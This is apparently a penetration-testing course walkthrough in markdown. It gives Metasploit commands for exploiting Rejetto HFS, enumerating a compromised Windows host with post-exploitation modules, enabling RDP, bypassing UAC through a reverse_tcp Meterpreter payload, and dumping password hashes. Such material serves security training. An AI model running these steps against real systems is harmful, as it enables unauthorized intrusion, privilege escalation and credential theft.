# Windows Post Exploitation Modules

## Overview

- **Metasploit Framework (MSF)** provides various **post-exploitation modules** for both Windows and Linux systems.
- These modules allow us to enumerate detailed information about the Windows system we've gained access to, such as:
  - **Enumerating user privileges**
  - **Identifying logged-on users**
  - **Checking if the target is a Virtual Machine (VM)**
  - **Enumerating installed programs and patches**
  - **Checking antivirus software and excluded folders**
  - **Enumerating computers connected to a domain**
  - **Enumerating shared directories**

## Demo: Windows Post Exploitation Modules

### Step-by-Step Process

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the post-exploitation process:

```bash
workspace -a windows_post
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

Perform an Nmap scan to identify services:

```bash
db_nmap -sV [targetIP]
```

Search for an **exploitation module** (e.g., Rejetto HFS):

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Show available options:

```bash
show options
```

Run the exploit to gain access:

```bash
run
```

### Interacting with Meterpreter Session

Once access is obtained, interact with the Meterpreter session:

- Retrieve system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Display Meterpreter help:

    ```bash
    help
    ```

- Attempt to escalate privileges:

    ```bash
    getsystem
    ```

- Take a screenshot of the target's desktop:

    ```bash
    screenshot
    ```

- Display mounted drives:

    ```bash
    show_mounts
    ```

- Migrate to another process (replace `2212` with the actual process ID):

    ```bash
    migrate 2212
    ```

- Check the current working directory:

    ```bash
    pwd
    ```

- Download a file from the target system:

    ```bash
    download flag.txt
    ```

Put the session in the background:

```bash
background
```

### Using Post-Exploitation Modules

#### Changing Architecture

Use the **migrate** post-exploitation module to change the architecture:

```bash
use post/windows/manage/migrate
```

Show the available options:

```bash
show options
```

#### Enumerating User Privileges

Search for a **privileges enumeration module**:

```bash
search win_privs
```

Use the **win_privs** module to enumerate the privileges of the current user:

```bash
use post/windows/gather/win_privs
```

Show options:

```bash
show options
```

Set the current session (assuming session `1`):

```bash
set SESSION 1
```

Run the module:

```bash
run
```

#### Enumerating Logged-On Users

Search for a module to enumerate logged-on users:

```bash
search enum_logged_on
```

Use the **enum_logged_on_users** module:

```bash
use post/windows/gather/enum_logged_on_users
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Checking If Target Is a Virtual Machine

Search for the **check_vm** module:

```bash
search checkvm
```

Use the **checkvm** module:

```bash
use post/windows/gather/checkvm
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Programs

Search for the **enum_applications** module:

```bash
search enum_applications
```

Use the **enum_applications** module:

```bash
use post/windows/gather/enum_applications
```

Show options and run the module:

```bash
set SESSION 1
run
```

The module will provide a list of installed programs, which can be cross-referenced to identify potential exploitation opportunities.

Check the collected information:

```bash
loot
```

#### Checking Antivirus Software and Excluded Folders

Search for the **AV enumeration** module:

```bash
search type:post platform:windows enum_av
```

Use the **enum_av_excluded** module:

```bash
use post/windows/gather/enum_av_excluded
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Computers in the Domain

Search for the **enum_computers** module:

```bash
search enum_computer
```

Use the **enum_computers** module:

```bash
use post/windows/gather/enum_computers
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enumerating Installed Patches

Search for the **enum_patches** module:

```bash
search enum_patches
```

Use the **enum_patches** module:

```bash
use post/windows/gather/enum_patches
```

Show options and run the module:

```bash
set SESSION 1
run
```

Alternatively, gather patch information manually:

- Switch to session `1`:

    ```bash
    sessions 1
    ```

- Use the Windows shell to get system info:

    ```bash
    shell
    systeminfo
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

#### Enumerating Shares

Search for the **enum_shares** module:

```bash
search enum_shares
```

Use the **enum_shares** module:

```bash
use post/windows/gather/enum_shares
```

Show options and run the module:

```bash
set SESSION 1
run
```

#### Enabling Remote Desktop (RDP)

Search for an **RDP management module**:

```bash
search rdp platform:windows
```

Use the **enable_rdp** module to enable RDP:

```bash
use post/windows/manage/enable_rdp
```

Show options and run the module:

```bash
set SESSION 1
run
```

### Conclusion

What we accomplished:
- Gained access to a Windows system via Meterpreter.
- Used various **post-exploitation modules** to gather critical information about the system, including user privileges, installed programs, AV solutions, and more.
- Managed the session to further exploit the system and establish deeper control.

# Windows Privilege Escalation: Bypassing UAC

## Bypassing UAC (User Account Control)

- **User Account Control (UAC)**: A Windows security feature introduced in **Windows Vista** to prevent unauthorized changes to the operating system.
- **Purpose of UAC**: Ensures that administrative changes to the OS require explicit approval from the user, preventing unauthorized or malicious actions.
- **Bypassing UAC**: We can use the **Windows Escalate UAC Protection Bypass (In Memory Injection)** Metasploit module. This module bypasses UAC by using the trusted publisher certificate through process injection, which spawns a second shell with UAC disabled.

## Demo: Windows Privilege Escalation: Bypassing UAC

### Step-by-Step Process

Start by checking network configuration:

```bash
ifconfig
```

Start PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the UAC bypass:

```bash
workspace -a UACBypass
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Initial Exploitation

Perform an Nmap scan to identify open ports and services on the target:

```bash
db_nmap -sV [targetIP]
```

Search for the **Rejetto HFS exploit** module:

```bash
search rejetto
```

Use the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

### Setting the Payload

Since we want to elevate our privileges to **x64**, we need to use a 64-bit payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the network interface (replace `eth1` with your correct interface):

```bash
set LHOST eth1
```

Run the exploit to obtain a **Meterpreter session**:

```bash
run
```

### Post-Exploitation: Initial Privilege Enumeration

After successfully obtaining a **Meterpreter session**, gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Attempt to elevate privileges:

```bash
getsystem
```

Check which privileges we currently have:

```bash
getprivs
```

Verify if we are part of the **Administrators group**:

```bash
shell
```

In the shell, run the following commands:

- List users:

    ```bash
    net users
    ```

- Check if the current user is part of the **Administrators** group:

    ```bash
    net localgroup administrators
    ```

Exit the shell:

```bash
CTRL + C
CTRL + Z
```

### Bypassing UAC

List all active sessions:

```bash
sessions
```

Search for the **bypassuac** module:

```bash
search bypassuac
```

Use the **bypassuac_injection** module:

```bash
use exploit/windows/local/bypassuac_injection
```

Set the payload for the **x64 architecture**:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Show the available options:

```bash
show options
```

Set the session ID of the previously obtained shell (assumed to be `1`):

```bash
set SESSION 1
```

Set the local port for the reverse connection (in this case, **4433**):

```bash
set LPORT 4433
```

Run the module:

```bash
run
```

### Selecting the Target

Set the target to **Windows x64** using tab autocompletion:

```bash
set TARGET Windows\ x64
```

Run the exploit again:

```bash
run
```

### Verifying the Second Meterpreter Session

Once the exploit completes, a second **Meterpreter session** will be created with **UAC disabled**.

Check system information in the new session:

```bash
sysinfo
```

Check the user ID to confirm administrative privileges:

```bash
getuid
```

Attempt to escalate privileges again:

```bash
getsystem
```

### Post-Exploitation

With the UAC bypassed, dump the password hashes from the target system:

```bash
hashdump
```

### Conclusion

What we accomplished:
- Used the **Rejetto HFS exploit** to gain an initial Meterpreter session on the target.
- Gathered system and privilege information.
- Used the **UAC bypass module** to create a second **Meterpreter session** with elevated privileges.
- Successfully escalated privileges, disabled UAC, and dumped the password hashes.










